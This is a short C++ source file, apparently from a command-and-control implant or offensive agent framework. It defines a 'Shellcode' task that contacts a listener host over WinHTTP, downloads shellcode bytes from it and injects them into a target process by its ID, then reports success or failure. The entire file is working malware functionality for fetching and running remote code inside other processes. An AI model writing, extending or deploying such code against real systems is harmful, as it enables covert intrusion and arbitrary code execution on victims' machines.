#include "core/task.hpp"

namespace Task
{
     std::wstring Shellcode(HINTERNET hConnect, const std::wstring& wPid, const std::wstring& wSrc)
     {
        DWORD dwPid = Utils::Convert::WstringToDWORD(wPid, 10);
        std::string sSrc = Utils::Convert::UTF8Encode(wSrc);

        // Download shellcode
		System::Http::WinHttpResponse resp = System::Http::SendRequest(
			hConnect,
			LISTENER_HOST_W,
			LISTENER_PORT,
			REQUEST_PATH_DOWNLOAD_W,
			L"POST",
			L"",
			(LPVOID)sSrc.c_str(),
			(DWORD)strlen(sSrc.c_str())
		);
		if (!resp.bResult || resp.dwStatusCode != 200)
		{
			return L"Error: Failed to download shellcode.";
		}

        std::vector<BYTE> respBytes = System::Http::ReadResponseBytes(resp.hRequest);
        if (respBytes.size() == 0)
        {
            return L"Error: Failed to read response data.";
        }

        // Inject shellcode
        if (!Technique::Injection::ShellcodeInjection(dwPid, respBytes))
        {
            return L"Error: Failed to inject shellcode.";
        }

        return L"Success: Shellcode injected successfully.";
     }
}